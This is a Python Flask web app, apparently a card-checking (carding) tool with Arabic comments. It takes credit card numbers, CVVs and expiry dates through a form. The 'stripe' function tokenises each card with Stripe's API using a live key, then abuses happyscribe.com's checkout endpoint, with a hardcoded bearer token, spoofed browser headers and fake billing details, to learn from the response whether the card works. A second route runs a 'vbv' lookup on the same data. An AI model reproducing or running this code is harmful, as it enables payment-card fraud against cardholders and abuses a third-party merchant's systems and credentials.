from flask import Flask, render_template, request
from datetime import datetime
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from gates import lookup
import os
import requests
import re
import base64,json
import random,uuid
import string
app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["10 per minute"]
)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/auth1', methods=['GET', 'POST'])
@limiter.limit("10 per minute")
def auth1():
    if request.method == 'POST':
        name = request.form['name']
        card_number = request.form['card_number']
        cvv = request.form['cvv']
        exp_month = request.form['exp_month']
        exp_year = request.form['exp_year']

        errors = validate_card_info(name, card_number, cvv, exp_month, exp_year)
        if errors:
            return render_template('form.html', auth_type='Auth1', errors=errors,
                                   name=name, card_number=card_number, cvv=cvv,
                                   exp_month=exp_month, exp_year=exp_year)

        result = check_card_validity(card_number, cvv, exp_month, exp_year, "auth1")
        return render_template('result.html', result=result)

    return render_template('form.html', auth_type='Auth1', 
                           name='', card_number='', cvv='', exp_month='', exp_year='')

@app.route('/auth2', methods=['GET', 'POST'])
@limiter.limit("10 per minute")  # تحديد حد الطلبات لـ auth2
def auth2():
    if request.method == 'POST':
        name = request.form['name']
        card_number = request.form['card_number']
        cvv = request.form['cvv']
        exp_month = request.form['exp_month']
        exp_year = request.form['exp_year']

        errors = validate_card_info(name, card_number, cvv, exp_month, exp_year)
        if errors:
            return render_template('form.html', auth_type='Auth2', errors=errors,
                                   name=name, card_number=card_number, cvv=cvv,
                                   exp_month=exp_month, exp_year=exp_year)

        result = stripe(card_number, cvv, exp_month, exp_year, "auth2")
        return render_template('result.html', result=result)

    return render_template('form.html', auth_type='Auth2', 
                           name='', card_number='', cvv='', exp_month='', exp_year='')

# دالة للتحقق من البيانات المدخلة
# دالة للتحقق من البيانات المدخلة
def validate_card_info(name, card_number, cvv, exp_month, exp_year):
    errors = []

    if not name or not card_number or not cvv or not exp_month or not exp_year:
        errors.append("All fields are required.")
    if len(card_number) != 16:
        errors.append("Card number must be 16 digits.")
    if len(cvv) != 3:
        errors.append("CVV must be 3 digits.")

    # تحقق من أن الشهر صحيح (01-12)
    if not (1 <= int(exp_month) <= 12):
        errors.append("Expiration month must be between 01 and 12.")
    
    # تحقق من أن السنة تتكون من رقمين
    if len(exp_year) != 2 or not exp_year.isdigit():
        errors.append("Expiration year must be two digits.")
    current_date = datetime.now()
    try:
        card_expiry_date = datetime(int("20" + exp_year), int(exp_month), 1)
    except ValueError:
        errors.append("Invalid date.")
        return errors
    return errors
def stripe(n, cv, m, y, auth_type):
	try:
		payload = f"type=card&billing_details%5Bname%5D=Allene+Powlowski&card%5Bnumber%5D={n}&card%5Bcvc%5D={cv}&card%5Bexp_month%5D={m}&card%5Bexp_year%5D={y}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F89bde95bba%3B+stripe-js-v3%2F89bde95bba%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=22233&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options%5Bhcaptcha_token%5D=NA"
		tok = requests.post('https://api.stripe.com/v1/payment_methods', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}, data=payload).json()['id']
		url = "https://www.happyscribe.com/api/iv1/confirm_payment"
		payload = json.dumps({
  "id": 12623064,
  "address": "stret",
  "name": "Allene Powlowski",
  "country": "GB",
  "vat": None,
  "billing_account_id": 12623064,
  "orderReference": "qtpnvalez",
  "user_id": 13450320,
  "organization_id": 12943992,
  "hours": 0,
  "balance_increase_in_cents": None,
  "payment_method_id": tok,
  "transcription_id": None,
  "plan": "basic_2023_05_01",
  "order_id": None,
  "recurrence_interval": "month",
  "extra_plan_hours": None
})
		headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Accept': "application/json",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
  'sec-ch-ua-mobile': "?1",
  'authorization': "Bearer QmNPGhYGAhngwRor8NSJCwtt",
  'sec-ch-ua-platform': "\"Android\"",
  'origin': "https://www.happyscribe.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.happyscribe.com/v2/12943992/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details",
  'accept-language': "en-GB,en;q=0.9",
}
		response = requests.post(url, data=payload, headers=headers)
		if 'Unauthorized' in response:
			return 'Soon Stripe'
		try:
			return response.json()["error"]
		except:
			return response.text
	except:
		return 'Has Error In Stripe'
def check_card_validity(n, cv, m, y, auth_type):
	ccx=f"{n}|{m}|{y}|{cv}"
	a=lookup.vbv(ccx)
	return a
@app.errorhandler(429)
def ratelimit_error(e):
    return render_template('ratelimit.html'), 429

if __name__ == '__main__':
    app.run(debug=True)
